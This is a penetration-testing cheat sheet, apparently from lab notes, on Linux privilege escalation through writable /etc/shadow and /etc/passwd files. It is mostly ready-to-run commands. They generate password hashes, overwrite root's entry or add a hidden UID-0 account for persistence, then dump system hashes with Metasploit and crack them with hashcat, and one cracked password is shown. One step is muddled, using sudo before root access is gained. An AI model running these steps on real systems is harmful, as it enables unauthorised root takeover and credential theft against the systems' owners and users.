# Weak File Permissions

## 01 - Unix Shell

### 1.1 - Writable Shadow File

Nowadays most modern Linux servers and desktops currently are most up-to-date and I can say you'll rarely find it or not. Yet you can use this method as a persistence technique yet it's not OPSEC safe to do so but hey you'll might need it under certain circumstances.

- **Weak File Permissions - Writable `/etc/shadow`**

`$ cp /etc/shadow /tmp/shadow.bak && sudo chmod o+r /etc/shadow`

We have two ways to generate a sha512crypt hashed passwords:

- **Method 1**

`$ mkpasswd -m sha-512 newpass1234`

- **Method 2**

`$ python -c 'import crypt; print(crypt.crypt("newpass1234", "$6$salt"))'`

Then edit the shadow file `root:<sha512crypt_hash>:17298:0:99999:7:::` replace the old `<sha512crypt_hash>` which starts with $6$ into a new one that was previously generated.

Then try to authenticate and you're root.

`$ su root`

### 1.2 - Writable Passwd File

- **Weak File Permissions - Writable `/etc/passwd`**

`$ openssl passwd -1 thispass123`

For older linux systems

`$ openssl passwd -1 -salt new thispass123`

We have two ways to modify the `passwd` file:

- **Method 1**

Replace the letter 'x' for the newly generated salt hash for the `/etc/passwd`

`root:x:0:0:root:/root:/bin/bash`

Authenticate as root with the password

`$ su root`

- **Method 2**

Create a new account as root with the previous generated hashed password. Here's what the format looks like:

**Note:** replace `<new_hash>` with the hashed password

`systemadmin:<new_hash>:0:0:Sysadmin:/root:/bin/bash`

## 02 - Metasploit

```
meterpreter > run post/linux/gather/hashdump

[-] Failed to open file: /etc/security/opasswd: core_channel_open: Operation failed: 1
[+] root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:0:0:root:/root:/bin/bash
[+] TCM:$6$hDHLpYuo$El6r99ivR20zrEPUnujk/DgKieYIuqvf9V7M.6t6IZzxpwxGIvhqTwciEw16y/B.7ZrxVk1LOHmVb/xyEyoUg.:1000:1000:user,,,:/home/user:/bin/bash
[+] Unshadowed Password File: /root/.msf4/loot/20220523135620_default_10.10.198.41_linux.hashes_820054.txt

$ sudo hashcat -a 0 -m 1800 /root/.msf4/loot/20220523135620_default_10.10.198.41_linux.hashes_820054.txt /usr/share/wordlists/rockyou.txt -O --force

$ sudo hashcat -a 0 -m 1800 /root/.msf4/loot/20220523135620_default_10.10.198.41_linux.hashes_820054.txt /usr/share/wordlists/rockyou.txt -O --force --show
$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:password123
```

## References

- [Linux Privesc Wrong Permissions](https://wixnic.github.io/linux-privesc-wrong-permissions/)

- [Linux Privilege Escalation Writable Passwd File](https://steflan-security.com/linux-privilege-escalation-writable-passwd-file/)